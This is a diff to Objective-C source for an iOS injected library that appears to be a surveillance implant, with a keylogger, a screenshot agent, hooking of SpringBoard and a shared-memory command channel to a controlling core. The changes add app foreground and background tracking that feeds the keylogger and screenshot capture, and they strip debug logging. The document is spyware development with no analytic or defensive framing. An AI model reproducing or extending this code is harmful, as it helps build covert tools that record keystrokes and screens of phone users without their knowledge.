@@ -66,6 +66,8 @@ static int scrFlag          = 0;
 static int appFlag          = 0;
 static int stdFlag          = 0;
 
+static int gContextHasBeenSwitched = 0;
+
 RCSISharedMemory      *mSharedMemoryCommand = nil;
 RCSISharedMemory      *mSharedMemoryLogging = nil;
 RCSIKeyLogger         *gLogger;
@@ -748,15 +750,16 @@ BOOL triggerStanByAction(UInt32 aAction)
 
               scrFlag = 1;
 
+              // XXX- try to release
               NSData *agentData = [[NSData alloc] initWithBytes: shMemCommand->commandData 
-                length: shMemCommand->commandDataSize];
+                                                         length: shMemCommand->commandDataSize];
 
               agentConfiguration = [[NSMutableDictionary alloc] init];
 
               [agentConfiguration setObject: AGENT_START 
-                forKey: @"status"];
+                                     forKey: @"status"];
               [agentConfiguration setObject: agentData 
-                forKey: @"data"];
+                                     forKey: @"data"];
 
               RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
               [scrAgent setAgentConfiguration: agentConfiguration];
@@ -1163,8 +1166,8 @@ BOOL triggerStanByAction(UInt32 aAction)
       NSLog(@"[DYLIB] %s: not SB don't hooking", __FUNCTION__);
 #endif      
       [NSThread detachNewThreadSelector: @selector(communicateWithCore)
-        toTarget: self
-        withObject: nil];
+                               toTarget: self
+                             withObject: nil];
     }
 }
 
@@ -1173,8 +1176,20 @@ BOOL triggerStanByAction(UInt32 aAction)
 
 }
 
+#define APP_IN_BACKGROUND 0
+#define APP_IN_FOREGROUND 1
+
 - (void)appInForeground
 {
+  if (gContextHasBeenSwitched == APP_IN_BACKGROUND)
+    {
+      gContextHasBeenSwitched = APP_IN_FOREGROUND;
+      [gLogger setMContextHasBeenSwitched: TRUE];
+    }
+  
+  RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
+  [scrAgent setMContextHasBeenSwitched:APP_IN_FOREGROUND];
+  
   NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
   if ([execName compare: CAMERA_APP] == NSOrderedSame)
     {
@@ -1184,6 +1199,12 @@ BOOL triggerStanByAction(UInt32 aAction)
 
 - (void)appInBackground
 {
+  if (gContextHasBeenSwitched == APP_IN_FOREGROUND)
+    gContextHasBeenSwitched = APP_IN_BACKGROUND;
+    
+  RCSIAgentScreenshot *scrAgent = [RCSIAgentScreenshot sharedInstance];
+  [scrAgent setMContextHasBeenSwitched:APP_IN_BACKGROUND];
+  
   NSString *execName = [[NSBundle mainBundle] bundleIdentifier];
   if ([execName compare: CAMERA_APP] == NSOrderedSame)
     {
@@ -1208,23 +1229,13 @@ extern "C" void RCSIInit ()
   NSAutoreleasePool *pool     = [[NSAutoreleasePool alloc] init];
   
   NSString *bundleIdentifier  = [[NSBundle mainBundle] bundleIdentifier];
-  
-#ifdef DEBUG
-  NSLog (@"[DYLIB] %s: RCSIphone loaded by %@ @ %@", __FUNCTION__, bundleIdentifier,
-         [[NSBundle mainBundle] bundlePath]);
-#endif
-  
+
   RCSILoader *loader = [[RCSILoader alloc] init];
   
 #ifdef CORE_DEMO
   if ([bundleIdentifier compare: SPRINGBOARD] == NSOrderedSame)
     {
-#ifdef DEBUG
-      NSLog(@"[DYLIB] %s: SB hooking init", __FUNCTION__);
-#endif
-
       AudioServicesPlaySystemSound(1304);
-
       [loader hookingForCoreDemo];
     }
 #endif
@@ -1233,18 +1244,8 @@ extern "C" void RCSIInit ()
                                            selector: @selector(startCoreCommunicator)
                                                name: UIApplicationDidFinishLaunchingNotification
                                              object: nil];
-  /*
-   [[NSNotificationCenter defaultCenter] addObserver: loader
-   selector: @selector(stopCoreCommunicator)
-   name: UIApplicationWillTerminateNotification
-   object: nil];
-   */
-   
-   NSInteger OSMajor = [[[UIDevice currentDevice] systemVersion] integerValue];
 
-#ifdef DEBUG
-   NSLog(@"[DYLIB] %s: OSMajor %d", __FUNCTION__, OSMajor);
-#endif
+   NSInteger OSMajor = [[[UIDevice currentDevice] systemVersion] integerValue];
 
    if (OSMajor >= 4)
      {
@@ -1263,5 +1264,6 @@ extern "C" void RCSIInit ()
                                                    name: @"UIApplicationWillTerminateNotification"
                                                  object: nil];
      }
+     
   [pool drain];
 }
